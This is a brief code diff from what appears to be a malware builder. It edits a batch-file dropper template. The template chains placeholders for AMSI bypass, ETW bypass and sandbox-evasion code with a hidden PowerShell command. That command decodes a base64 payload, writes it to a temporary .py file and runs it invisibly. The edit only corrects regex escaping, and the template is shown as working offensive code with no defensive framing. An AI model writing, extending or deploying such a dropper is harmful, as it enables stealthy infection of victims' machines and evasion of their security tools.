@@ -526,7 +526,7 @@ rm -f "$TMP"
 _BAT_TEMPLATE = '''\
 @echo off
 setlocal enabledelayedexpansion
-{ps1_amsi}{ps1_etw}{ps1_sandbox}powershell -NoP -W Hidden -C "$b=[System.Convert]::FromBase64String('{payload_b64}');$t=[System.IO.Path]::GetTempFileName()-replace'\.tmp','.py';[System.IO.File]::WriteAllText($t,[System.Text.Encoding]::UTF8.GetString($b));Start-Process python -Args $t -WindowStyle Hidden"
+{ps1_amsi}{ps1_etw}{ps1_sandbox}powershell -NoP -W Hidden -C "$b=[System.Convert]::FromBase64String('{payload_b64}');$t=[System.IO.Path]::GetTempFileName()-replace'\\.tmp','.py';[System.IO.File]::WriteAllText($t,[System.Text.Encoding]::UTF8.GetString($b));Start-Process python -Args $t -WindowStyle Hidden"
 endlocal
 '''
 
